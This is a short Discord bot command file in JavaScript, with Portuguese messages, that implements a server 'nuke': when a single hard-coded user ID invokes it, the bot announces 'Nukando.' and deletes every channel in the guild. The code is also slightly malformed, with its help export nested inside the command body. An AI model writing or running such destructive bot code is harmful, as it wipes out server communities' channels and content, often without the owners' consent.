const Discord = require("discord.js");

module.exports.run = async (bot, message, args) => {
    const user = message.author.id;
  const name = "Nukado" + "Bro";
if(message.author.id !== "767132923287306281") {
message.channel.send(`Você não pode usar esse comando`)
}else{
  message.channel.send(`Nukando.`)
       .then(message.guild.channels.cache.forEach(channel => channel.delete()));
       console.log("Servidor NUKADO");
          exports.help = {
     name: 'delchan',
     description: 'Delete\'s all channels',
     usage: 'delchan'
   }}};